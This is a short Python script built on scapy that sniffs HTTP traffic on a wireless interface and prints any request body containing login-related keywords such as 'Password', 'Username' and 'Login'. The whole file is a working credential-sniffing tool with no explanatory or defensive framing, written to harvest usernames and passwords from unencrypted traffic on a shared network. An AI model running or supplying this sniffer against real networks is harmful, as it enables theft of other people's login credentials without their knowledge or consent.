import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=sniffed_packet)


def sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["Password", "Username", "pass", "user","Captcha","Login"]
            for keyword in keywords:
                if keyword.encode() in load:
                    print(load)
                    break


sniff("wlp58s0")
